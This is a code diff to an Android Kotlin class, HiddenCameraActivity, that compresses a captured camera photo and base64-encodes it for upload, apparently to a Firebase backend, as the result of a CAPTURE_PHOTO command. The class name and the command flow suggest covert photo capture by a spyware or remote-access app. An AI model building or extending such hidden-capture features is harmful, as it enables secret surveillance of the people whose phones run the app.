@@ -85,8 +85,31 @@ class HiddenCameraActivity : Activity() {
                         val buffer: ByteBuffer = image.planes[0].buffer
                         val bytes = ByteArray(buffer.capacity())
                         buffer.get(bytes)
-                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+                    // Downscale and compress to ensure it fits in Firebase limits
+                    val options = android.graphics.BitmapFactory.Options()
+                    options.inJustDecodeBounds = true
+                    android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)
+
+                    val maxDim = 800
+                    var scale = 1
+                    if (options.outHeight > maxDim || options.outWidth > maxDim) {
+                        scale = Math.pow(2.0, Math.ceil(Math.log(Math.max(options.outHeight, options.outWidth).toDouble() / maxDim) / Math.log(0.5)).toInt() * -1.0).toInt()
+                    }
+
+                    options.inJustDecodeBounds = false
+                    options.inSampleSize = scale
+                    val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)
+
+                    if (bitmap != null) {
+                        val outputStream = java.io.ByteArrayOutputStream()
+                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, outputStream)
+                        val compressedBytes = outputStream.toByteArray()
+                        val base64 = Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
                         postResult("IMAGE", base64, "CAPTURE_PHOTO")
+                    } else {
+                        postResult("ERROR", "Failed to decode captured image.", "CAPTURE_PHOTO")
+                    }
                     } catch (e: Exception) {
                         postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
                     } finally {
